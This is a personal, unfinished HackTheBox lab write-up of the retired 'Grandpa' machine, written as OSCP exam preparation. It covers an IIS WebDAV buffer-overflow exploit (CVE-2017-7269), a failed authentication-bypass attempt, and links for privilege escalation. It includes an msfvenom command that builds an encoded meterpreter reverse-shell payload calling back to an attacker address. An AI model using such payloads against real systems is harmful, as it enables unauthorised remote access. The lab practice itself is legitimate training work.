
Name: Grandpa
Date:  5/11/2022
Difficulty:  Easy
Goals:  OSCP Prep
Learnt:
- Old HTB boxes are weird
- I am sick weird old boxes  
- Need I too frantic

## Recon

![ping](HackTheBox/Retired-Machines/Grandpa/Screenshots/ping.png)

[[CVE-2000-0114-http___10.129.95.233__vti_inf.html]] is 0 in severity, but 
[[CVE-2017-7269-http___10.129.95.233]] is critical RCE 9.5! for a buffer overflow, which there is a metasploit exploit for [https://www.exploit-db.com/exploits/41992](https://www.exploit-db.com/exploits/41992). There is also an 
[Explaination](https://www.exploit-db.com/exploits/8704) for a Remote Authenication Bypass allowing unrestricted listing downloading and uploading of files into password protected WebDAV folder. The 8806.pl did seem to work and neither did adding `%c0%af` into `curl`'s against `/images/` and  `/_Private/`. 

![](searchsploitoutput.png )

I tried for serval hours over multiple months for this box, but I do not have the time to let learning fall by the wayside. Returning to this knowing it require authenicated bypassing 

![](webdav.png)

## Exploit

Headturning I thought about making this a Helpthrough with IT security, but
[Explodingcan](https://github.com/danigargu/explodingcan) was an options I remember, as I though about following along I decide to be the most OSCP about this and do this entirely with the python2 exploit. I had already had that written above and found and was a option. Emotionally I was frantic and am still abit for various reasons of due to the [[Granny-Helped-Through]].

I wanted ot use do bothmeterpreter and the shell version and privilege escalation on windows XP does bananas time wise. But I have been burnt really hard for time and stressing about myself that its sort of me, but it is also these boxes. 
```
msfvenom -p windows/meterpreter/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=10.10.14.109 LPORT=80 > shellcode-met
```

```bash 
Traceback (most recent call last):
  File "41738.py", line 43, in <module>
    data = sock.recv(80960)
socket.error: [Errno 104] Connection reset by peer
```
Apparently
*Connection reset by peer" is the TCP/IP equivalent of slamming the phone back on the hook. It's more polite than merely not replying, leaving one hanging. But it's not the FIN-ACK expected of the truly polite TCP/IP converseur."*

The hellscape of python:
https://python.readthedocs.io/en/v2.7.2/library/httplib.html is renameed to http.client, 

I got a shell on the box, but I know would I run into the same issues, but I got metasploit issues. I know the metasploit exploit works, just not the privesc. I will finish this later a bit more calmly.

## Foothold

## PrivEsc      
https://0xdf.gitlab.io/2020/05/28/htb-grandpa.html

https://github.com/Re4son/Churrasco/